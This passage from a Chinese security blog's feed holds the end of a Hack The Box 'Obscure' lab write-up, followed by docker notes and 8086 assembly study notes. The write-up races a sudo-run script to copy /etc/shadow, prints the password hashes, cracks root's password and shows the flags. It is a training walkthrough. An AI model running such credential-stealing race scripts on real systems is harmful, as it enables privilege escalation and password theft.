class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</span><br></pre></td></tr></table></figure><blockquote><p>这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 <code>python3 -m http.server 8001</code> 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的</p></blockquote><p>将 xxd 得到的结果复制出来，然后我们可以通过<code>xxd -r</code> 反向 <code>dump</code> 出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~$ xxd out.txt</span><br><span class="line">00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................</span><br><span class="line">00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................</span><br><span class="line">00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................</span><br><span class="line">00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................</span><br><span class="line">00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................</span><br><span class="line">00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................</span><br><span class="line">00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................</span><br><span class="line">00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................</span><br><span class="line">00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................</span><br><span class="line">00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................</span><br><span class="line">000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................</span><br><span class="line">000000b0: c38c c397 c289 c281 76                   ........v</span><br></pre></td></tr></table></figure><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>得到密钥之后我们再解密即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d</span><br><span class="line">k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d</span><br><span class="line"><span class="comment">################################</span></span><br><span class="line"><span class="comment">#           BEGINNING          #</span></span><br><span class="line"><span class="comment">#    SUPER SECURE ENCRYPTOR    #</span></span><br><span class="line"><span class="comment">################################</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">  <span class="comment">#        FILE MODE         #</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">Opening file passwordreminder.txt...</span><br><span class="line">Decrypting...</span><br><span class="line">Writing to /tmp/key.txt...</span><br><span class="line">www-data@obscure:/home/robert$ cat /tmp/key.txt</span><br><span class="line">cat /tmp/key.txt</span><br><span class="line">SecThruObsFTW</span><br></pre></td></tr></table></figure><p>成功登陆</p><p>拿到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~$ ls</span><br><span class="line">BetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txt</span><br><span class="line">robert@obscure:~$ cat user.txt</span><br><span class="line">e4493782066b55fe2755708736ada2d7</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>robert用户登陆之后，<code>sudo -l</code> 查看能够执行的root命令，发现能够以root身份执行 <code>BetterSSH.py</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> robert on obscure:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User robert may run the following commands on obscure:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br></pre></td></tr></table></figure><p>审计源码发现关键点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'/etc/shadow'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">data = [(p.split(<span class="string">":"</span>) <span class="keyword">if</span> <span class="string">"$"</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">passwords = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">        passwords.append(x)</span><br><span class="line"></span><br><span class="line">passwordFile = <span class="string">'\n'</span>.join([<span class="string">'\n'</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/SSH/'</span>+path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(passwordFile)</span><br></pre></td></tr></table></figure><p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    files = os.listdir(<span class="string">"./SSH"</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        shutil.copy(os.path.join(<span class="string">"./SSH"</span>, file), <span class="string">"./flag"</span>);</span><br></pre></td></tr></table></figure><p>或者使用 <code>shell</code> 脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/tmp$ cat scandir.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">/bin/bash</span></span><br><span class="line">path=$1</span><br><span class="line">while (true); do</span><br><span class="line">    file=$(ls $path)</span><br><span class="line">    if [ "$&#123;file&#125;" == "" ]</span><br><span class="line">    then</span><br><span class="line">        continue</span><br><span class="line">    else</span><br><span class="line">        mv $path/$file ./</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/tmp/flag$ ls</span><br><span class="line">Tdrs5183</span><br><span class="line">robert@obscure:/tmp/flag$ cat Tdrs5183</span><br><span class="line">root</span><br><span class="line">$<span class="number">6</span>$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span><br><span class="line"><span class="number">18226</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">99999</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">robert</span><br><span class="line">$<span class="number">6</span>$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/</span><br><span class="line"><span class="number">18163</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">99999</span></span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>john 解密得到 <code>mercedes</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: root</span><br><span class="line">Enter password: mercedes</span><br><span class="line">Authed!</span><br><span class="line">root@Obscure$ ls</span><br><span class="line">Output: SSH</span><br><span class="line">systemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtH</span><br><span class="line">systemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWi</span><br><span class="line">vmware-root_574-2990744286</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@Obscure$ cat /root/root.txt</span><br><span class="line">Output: 512fd4429f33a113a44d5acde23609e3</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本使用指南</title>
      <link href="/posts/70b2e753/"/>
      <url>/posts/70b2e753/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-遇到的坑"><a href="#docker-遇到的坑" class="headerlink" title="docker 遇到的坑"></a>docker 遇到的坑</h2><p>运行的时候不能直接用 <code>./</code> 指定当前的文件，需要 <code>$PWD</code></p><p>一次性清理所有的已经关闭的容器<br> <code>docker ps -a | grep Exit | cut -d &#39; &#39; -f 1 | xargs docker rm</code></p><p><code>:ro</code> 表示只读</p><p>访问受到限制</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653426115.png" alt></p><p>此时目录下的文件权限</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653436093.png" alt></p><p>重新运行了一下</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653447982.png" alt></p><p>看来是文件权限的问题，也就是说docker会默认将文件权限直接复制过来，由于我之前的那个用户是pxy，而docker环境中并没有这个用户，导致就变成了1000</p><h2 id="移除镜像"><a href="#移除镜像" class="headerlink" title="移除镜像"></a>移除镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm xxxx</span><br></pre></td></tr></table></figure><h2 id="–link-参数"><a href="#–link-参数" class="headerlink" title="–link 参数"></a>–link 参数</h2><p>自动添加了环境变量</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653523204.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653527989.png" alt></p><p>还有这个</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653537486.png" alt></p><p><code>/etc/hosts</code> 也会更新</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653546884.png" alt></p><p>神奇。。<br>运行nginx和php-fpm<br><code>docker run --name  myphp-fpm -v $PWD/www:/www  -d php:5.6-fpm</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name runoob-php-nginx -p 8083:80 -d \           </span><br><span class="line">    -v $PWD&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html:ro \</span><br><span class="line">    -v $PWD&#x2F;conf&#x2F;conf.d:&#x2F;etc&#x2F;nginx&#x2F;conf.d:ro \</span><br><span class="line">    --link myphp-fpm:php \ ----&gt; 注意需要取别名</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>如果不取别名的话直接闪退，别名可以理解成对应的主机地址</p><p><img src= "/img/loading.gif" data-src="/posts/70b2e753/1580653561167.png" alt></p><p>然后开始折腾docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./www:/usr/share/nginx/html</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">myphp-fpm</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">myphp-fpm:php</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"8083:80"</span></span><br><span class="line">  <span class="attr">myphp-fpm:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">php:5.6-fpm</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./www:/www</span></span><br></pre></td></tr></table></figure><p>试了多次，<code>links</code> 需要取别名</p><p>同时文件的权限也很重要，不然会出现无法读取flag的情况</p><h2 id="Dockerfile-编写"><a href="#Dockerfile-编写" class="headerlink" title="Dockerfile 编写"></a>Dockerfile 编写</h2><p><code>WORKDIR</code> 指定工作目录，这样就能够在执行一些shell命令的时候不需要指明路径了</p><h2 id="docker无法运行-mysql容器"><a href="#docker无法运行-mysql容器" class="headerlink" title="docker无法运行 mysql容器"></a>docker无法运行 mysql容器</h2><p>这是由于我偷懒只在本机安装了 mysql 得客户端，没有安装服务端，这也是很神奇了</p><h2 id="docker运行phpmyadmin"><a href="#docker运行phpmyadmin" class="headerlink" title="docker运行phpmyadmin"></a>docker运行phpmyadmin</h2><p>我发现并不需要 nginx ,当然如果有nginx的情况下可以做到反向代理比较好一点</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">phpmyadmin:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">phpmyadmin/phpmyadmin</span></span><br><span class="line">    <span class="attr">ports:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="number">8081</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql:db</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.6</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span></span><br></pre></td></tr></table></figure><h2 id="nginx结合mysql"><a href="#nginx结合mysql" class="headerlink" title="nginx结合mysql"></a>nginx结合mysql</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./www:/usr/share/nginx/html</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">myphp-fpm</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">myphp-fpm:php</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"8083:80"</span></span><br><span class="line">  <span class="attr">myphp-fpm:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">php/kuozhan</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./www:/www</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql:db</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.6</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span></span><br></pre></td></tr></table></figure><h2 id="nginx配置学习"><a href="#nginx配置学习" class="headerlink" title="nginx配置学习"></a>nginx配置学习</h2><p>nginx的配置文件以后再单独写，这里先学一点</p><p>怎么理解 nginx和php-fpm的关系呢</p><p>我在配置docker环境的时候意识到nginx和php两个镜像是相互独立的，首先运行php-fpm镜像，将其内部的 <code>/www</code> 映射到我外部的 <code>./www</code> 目录中，然后再运行 nginx 镜像，将其 <code>/usr/share/nginx/html</code> 映射到 <code>./www</code> 目录，同时还需要做两件事</p><ol><li>配置nginx，指定解析的脚本目在 <code>/www</code> 目录中</li><li>连接php-fpm容器，需要将解析到 php 这个域名才行</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土二</title>
      <link href="/posts/6cc1a5d6/"/>
      <url>/posts/6cc1a5d6/</url>
      
        <content type="html"><![CDATA[<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>intel的CPU是采用的小端法来存储数据</p><p>在查看内存的时候，我更愿意按照这样的方式，我认为0号应该代表第一根横线，也就是认为是第一个存储单元的开始，也就是说我觉得 0~1 这个单元存放着 20H，因为这样在后续分析栈的时候比较有用</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653048875.png" alt></p><p>字单元：存放一个字节型数据的内存单元，也就是两个字节16位，高位放高地址，低位放低地址</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>数据段寄存器默认为 ds</p><p>所以我们要操作内存数据的时候只需要指定偏移即可</p><p>CPU不支持直接将数据送入到段寄存器，需要有寄存器作为中转</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">1000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">bx</span></span><br><span class="line"><span class="keyword">mov</span> [<span class="number">0</span>],<span class="built_in">al</span></span><br></pre></td></tr></table></figure><p>上述代码的含义：先设置ds寄存器为1000H，然后将al中的数据送往这个内存单元(所以我们要移动数据到内存的时候是需要先设置数据段的基地址的)</p><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p>mov 段寄存器，寄存器<br>mov 寄存器，段寄存器<br>mov 内存单元，寄存器<br>mov 寄存器，内存单元<br>mov 段寄存器，内存单元<br>mov 内存单元，段寄存器</p><p>但是 add 指令不能直接操作段寄存器和寄存器</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653072050.png" alt></p><h2 id="数据段-1"><a href="#数据段-1" class="headerlink" title="数据段"></a>数据段</h2><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653090896.png" alt></p><p>AX=0，BX=0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,[0000] ;AX &#x3D; 2662H</span><br><span class="line">mov bx,[0001] ;BX &#x3D; E626H</span><br><span class="line">mov ax,bx     ;AX &#x3D; 2662H</span><br><span class="line">mov ax,[0000] ;AX &#x3D; 2662H</span><br><span class="line">mov bx,[0002] ;BX &#x3D; D6E6H</span><br><span class="line">add ax,bx     ;AX &#x3D; FD48H</span><br><span class="line">add ax,[0004] ;AX &#x3D; 2ECC+FD48 &#x3D; 2C14</span><br><span class="line">mov ax,0      ;AX &#x3D; 0</span><br><span class="line">mov al,[0002] ;AX &#x3D; E6H</span><br><span class="line">mov bx,0      ;BX &#x3D; 0</span><br><span class="line">mov bl,[000c] ;BX &#x3D; 00H</span><br><span class="line">add al,bl     ;AX &#x3D; E6H</span><br></pre></td></tr></table></figure><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>任意时刻 <code>SS:SP</code> 指向栈顶元素</p><p>PUSH 操作的过程</p><ol><li>SP = SP -2</li><li>SS:SP 指向新的地址</li><li>然后将数据送入到 <code>SS:SP</code> 指向的地址中</li></ol><p>然后就涉及到怎么计算 <code>SP</code> 的问题了</p><blockquote><p>只需要记住初始状态栈中没有元素，并且 SP+2 是栈中的第一个存储单元</p></blockquote><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653127959.png" alt></p><p>POP 指令</p><ol><li>将SS:SP 指向的内存单元数据送入到寄存器中，或者是某个内存单元中</li><li>SP = SP + 2</li></ol><p>PUSH和POP的指令形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push 寄存器</span><br><span class="line">pop 寄存器</span><br><span class="line"></span><br><span class="line">push 段寄存器</span><br><span class="line">pop 段寄存器</span><br><span class="line"></span><br><span class="line">push 内存单元</span><br><span class="line">pop 内存单元</span><br></pre></td></tr></table></figure><p>利用栈可以达到交换数据的目的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0010H</span><br><span class="line">mov ax,001AH</span><br><span class="line">mov bx,001BH</span><br><span class="line"></span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line"></span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br></pre></td></tr></table></figure><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653176153.png" alt></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">1000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">2000</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">0010H</span></span><br><span class="line"><span class="keyword">push</span>[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">push</span>[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">push</span>[<span class="number">4</span>]</span><br><span class="line"><span class="keyword">push</span>[<span class="number">6</span>]</span><br><span class="line"><span class="keyword">push</span>[<span class="number">8</span>]</span><br><span class="line"><span class="keyword">push</span>[A]</span><br><span class="line"><span class="keyword">push</span>[C]</span><br><span class="line"><span class="keyword">push</span>[E]</span><br></pre></td></tr></table></figure><p>现在 1000H~100FH 的内存内容为：</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653193364.png" alt></p><p>本着节约内存的想法</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653210499.png" alt></p><p>然而执行完之后的结果</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653219446.png" alt></p><p>看来节约内存不是件好事，于是我重新把 3000:0 作为代码段</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653228997.png" alt></p><p>这回成功了</p><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653238046.png" alt></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src= "/img/loading.gif" data-src="/posts/6cc1a5d6/1580653248493.png" alt></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">1000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">pop</span> [E]</span><br><span class="line"><span class="keyword">pop</span> [C]</span><br><span class="line"><span class="keyword">pop</span> [A]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">8</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">6</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">4</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> [<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>同样的，我先设置 